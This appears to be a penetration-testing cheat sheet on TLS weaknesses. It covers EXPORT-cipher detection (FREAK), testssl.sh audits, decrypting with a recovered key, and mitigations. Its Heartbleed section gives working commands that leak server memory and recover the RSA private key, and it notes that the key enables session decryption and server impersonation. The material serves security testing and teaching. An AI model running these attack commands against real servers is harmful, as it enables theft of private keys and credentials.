# Weak Ciphers, Heartbleed & TLS Config Testing

Grab-bag of the "scan / inspect / recover" techniques: spotting EXPORT-grade ciphers
(FREAK), leaking memory with Heartbleed, decrypting with a recovered key (PKI), and
auditing a whole endpoint with `testssl.sh`.

## EXPORT ciphers & FREAK

1990s US export rules capped key strength → `*_EXPORT_*` suites with 40/56-bit RSA or
symmetric keys, factorable in hours on modern hardware. **FREAK** (2015) MITMs a
connection into negotiating an EXPORT-RSA suite, then breaks the weak key.

Spot it in a capture:

```bash
tshark -r export.pcap -Y "tls.handshake.type == 1" -V | grep -i "Cipher Suite:" | grep -i export
# Cipher Suite: TLS_RSA_EXPORT_WITH_DES40_CBC_SHA (0x0008)
```

Any `EXPORT`, `DES`, `RC4`, `NULL`, or `40`/`56`-bit suite is a finding on its own.

## Heartbleed (CVE-2014-0160)

OpenSSL 1.0.1 heartbeat extension fails to bounds-check the length field, returning up to
64 KB of process memory per request — session data, credentials, and **private key
material**. With enough leaked chunks the RSA modulus factors and the full private key is
recoverable:

```bash
export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64; export PATH="$JAVA_HOME/bin:$PATH"

# Confirm
java -jar /opt/TLS-Breaker/apps/heartbleed-1.0.1.jar -connect TARGET:PORT
# → Vulnerability status: VULNERABLE

# Leak memory + auto-recover the private key (p, q, phi, d → PEM)
java -jar /opt/TLS-Breaker/apps/heartbleed-1.0.1.jar \
     -connect TARGET:PORT -executeAttack -heartbeats 30 | tee heartbleed.log
```

The tool finds a prime in the leaked memory, factors `n`, computes `p, q, phi, d`, and
writes a complete RSA private key (`private_key.pem`). With the key you decrypt past
captured sessions or impersonate the server.

## PKI — decrypt with a recovered private key

Once you hold the matching private key (from Heartbleed, a misconfigured download, etc.),
RSA-encrypted blobs fall to one command:

```bash
openssl pkeyutl -decrypt -inkey rsa.pem -in flag.enc
```

## Full config audit — testssl.sh

```bash
git clone --depth 1 https://github.com/drwetter/testssl.sh /opt/testssl.sh
bash /opt/testssl.sh/testssl.sh --openssl=/usr/bin/openssl --color 0 --quiet \
     --warnings off TARGET:PORT | tee testssl.log
```

What it surfaces in one pass:

- **Overall grade** (a self-signed cert / CN mismatch caps it at `T` regardless of suites).
- Offered protocol versions and the exact cipher list per version (count the 1.2 ciphers,
  flag any DES/RC4/EXPORT).
- Named-vuln checks: Heartbleed, CCS Injection (CVE-2014-0224), POODLE, SWEET32,
  LUCKY13, BEAST, ROBOT, etc.

`--openssl=/usr/bin/openssl` is often required — testssl's bundled OpenSSL build may fail
to connect where the system binary succeeds.

## Mitigations

Disable EXPORT/DES/RC4/NULL suites; patch OpenSSL (Heartbleed/CCS); use a valid CA-signed
cert with matching CN/SAN; TLS 1.2+ with AEAD; re-key and revoke any cert whose private
key may have leaked.
